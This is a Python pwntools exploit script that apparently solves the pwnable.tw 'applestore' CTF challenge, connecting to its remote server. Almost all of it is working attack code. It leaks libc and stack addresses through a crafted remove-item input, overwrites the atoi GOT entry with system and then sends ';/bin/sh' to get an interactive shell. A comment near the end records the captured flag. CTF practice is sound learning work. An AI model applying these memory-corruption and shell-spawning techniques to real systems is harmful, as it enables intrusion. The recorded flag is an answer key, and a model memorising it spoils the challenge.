#!/usr/bin/env python3

from pwn import *

exe = ELF("./applestore_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10104)

    return r


def main():
    r = conn()

  # puts("=== Menu ===");
  # printf("%d: Apple Store\n", 1);
  # printf("%d: Add into your shopping cart\n", 2);
  # printf("%d: Remove from your shopping cart\n", 3);
  # printf("%d: List your shopping cart\n", 4);
  # printf("%d: Checkout\n", 5);
  # printf("%d: Exit\n", 6);

    # good luck pwning :)
    input()
    def add_item(index):
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'> ', index)
    def remove_item(index):
        r.sendlineafter(b'> ', b'3')
        r.sendlineafter(b'> ', index)
    def list_cart():
        r.sendlineafter(b'> ', b'4')
        r.sendlineafter(b'> ', b'y')
    def check_out():
        r.sendlineafter(b'> ', b'5')
        r.sendlineafter(b'> ', b'y')
    # Take the iphone 8 
    for i in range(20):
        add_item(b'2')
    for i in range(6):
        add_item(b'1')
    check_out()
    # Leak libc from remove_item()
    payload = b'27' + p32(exe.got['puts'])
    remove_item(payload)
    r.recvuntil(b'27:')
    libc_leak = u32(r.recv(4))
    libc.address = libc_leak - libc.sym['puts']
    info('Libc leak: '+hex(libc_leak))
    info('Libc address: ' + hex(libc.address))
    system = libc.sym['system']

    payload = b'27' + p32(libc.sym['environ'])
    remove_item(payload)
    r.recvuntil(b'27:')
    stack_leak = u32(r.recv(4))
    info('Stack leak: ' + hex(stack_leak))
    ebp = stack_leak - 0x104
    payload = b'27' + p32(0)*2 + p32(exe.got['atoi'] + 0x22) + p32(ebp - 0x8)
    remove_item(payload)
    payload = p32(libc.sym['system']) + b';/bin/sh\0'
    r.sendlineafter(b'> ', payload)
    pause()
    # FLAG{I_th1nk_th4t_you_c4n_jB_1n_1ph0n3_8}
    r.interactive()


if __name__ == "__main__":
    main()
